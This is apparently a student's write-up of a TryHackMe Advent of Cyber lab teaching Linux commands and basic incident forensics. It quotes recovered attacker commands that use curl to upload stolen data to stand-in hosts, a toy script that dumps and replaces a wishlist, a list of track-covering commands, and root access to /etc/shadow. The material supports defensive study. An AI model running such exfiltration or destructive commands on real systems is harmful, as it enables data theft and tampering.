# Day 1: Shells and Bells - Linux Command Line

**Date:** December 1, 2025  
**Time Spent:** 2 hours  
**Difficulty:** ★☆☆☆  
**Category:** Linux / Foundational Skills  
**Room:** https://tryhackme.com/room/linuxcli-aoc2025-o1fpqkvxti

---

## Overview

McSkidy has been kidnapped. The investigation required analyzing the **tbfc-web01** server
to uncover clues by navigating the file system, searching for files, and reading command
history. The trail led to Sir Carrotbane and HopSec, who breached the server and deployed
a malicious script called `eggstrike.sh` that stole Christmas wishlists and replaced them
with fake ones.

---

## What I Learned

### Navigation and File Operations

```bash
pwd                             # Print working directory
cd /var/log                     # Navigate to absolute path
ls -la                          # List all files including hidden
cat README.txt                  # Display file contents
cat .guide.txt                  # View hidden file
```

Files and directories starting with `.` are hidden from standard `ls` output. Always
use `ls -la` during investigations. Attackers use the dot prefix to hide malware, and
`.bash_history` is stored the same way.

### Search and Investigation

```bash
grep "Failed password" auth.log         # Search for text patterns in logs
find /home/socmas -name *egg*           # Find files matching pattern
```

### System and User Management

```bash
whoami                  # Current user
sudo su                 # Switch to root
history                 # View command history
cat .bash_history       # Read bash history directly
```

### Bash History Forensics

The `.bash_history` file stores every command a user has run. On a compromised system,
it's often the first thing worth checking.

**What was found in `/root/.bash_history`:**

```bash
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
```

First command uploads the stolen wishlist to an attacker-controlled server. Second sends
obfuscated data to a C2 endpoint. Both used curl to blend in with normal traffic.

Attackers often try to clear history with `history -c` or delete `.bash_history` outright.
Finding it intact gives you the full picture.

### Log Analysis

```bash
grep "Failed password" auth.log
```

**Output:**
```
2025-10-13T01:43:48 tbfc-web01: Failed password for socmas from eggbox-196.hopsec.thm
```

Multiple failed login attempts on the `socmas` account originating from `eggbox-196.hopsec.thm`.
Classic brute-force pattern targeting the Christmas ordering system.

### Eggstrike.sh Analysis

Located using:
```bash
find /home/socmas -name *egg*
# Result: /home/socmas/2025/eggstrike.sh
```

**Script contents:**
```bash
# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Christmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"
```

**Attack chain:**
1. Read and deduplicate the wishlist, save to `/tmp/dump.txt` for exfiltration
2. Delete the original wishlist
3. Replace it with fake `eastmas.txt` content

### Shell Symbols

| Symbol | Purpose | Example |
|--------|---------|---------|
| `\|` | Pipe output to next command | `cat file \| grep "error"` |
| `>` | Overwrite file | `echo "log" > file.txt` |
| `>>` | Append to file | `echo "log" >> file.txt` |
| `&&` | Run second if first succeeds | `cd /tmp && ls` |
| `\|\|` | Run second if first fails | `cd /fake \|\| echo "Failed"` |
| `;` | Run sequentially regardless | `cd /tmp; ls; pwd` |

### Root Permissions

```bash
sudo su
whoami          # root
cat /etc/shadow # Now accessible
```

Root is the only account with unrestricted access. `/etc/shadow` (password hashes) is
protected from standard users. Attackers target root for full system compromise. Least
privilege applies here — only escalate when necessary.

---

## Challenges

The main room questions were fine. I attempted Side Quest 1 (The Great Disappearing Act)
for about an hour before accepting it was beyond my current level and moving on. Came back
to the rest of the event and will revisit it once fundamentals are stronger.

---

## Security+ Alignment

**Domain 3.0 - Security Architecture (18%):** OS security, file permissions, access
control, least privilege.

**Domain 4.0 - Security Operations (28%):** Log analysis, incident investigation,
forensic techniques, command-line tools.

---

## Key Takeaways

**Bash history forensics checklist:**
- `curl`/`wget` commands — data exfiltration or malware download
- `ssh`/`scp` commands — lateral movement
- `find`/`locate` — reconnaissance
- `sudo`/`su` attempts — privilege escalation
- `rm -rf`, `shred` — evidence destruction
- `history -c`, `rm .bash_history` — covering tracks

**Log patterns:**
```bash
grep "Failed password" /var/log/auth.log        # Brute-force attempts
grep "Accepted password" /var/log/auth.log      # Successful logins
grep "sudo" /var/log/auth.log                   # Privilege escalation
grep "Failed password" auth.log | wc -l         # Count attempts
```

**Hidden file investigation:**
```bash
ls -la                          # Show all hidden files
find . -name ".*"               # Find hidden files in current dir
cat ~/.bash_history             # Command history
ls -la ~/.ssh/                  # SSH keys (lateral movement)
```

**Incident response order:**
1. `pwd`, `whoami`, `ls -la` — situational awareness
2. `cd /var/log`, `grep "Failed" auth.log` — check logs
3. `find / -name "*.sh"` — find suspicious scripts
4. `cat ~/.bash_history` — attacker commands
5. `sudo su` — escalate only if needed for protected files
6. Document everything before making changes
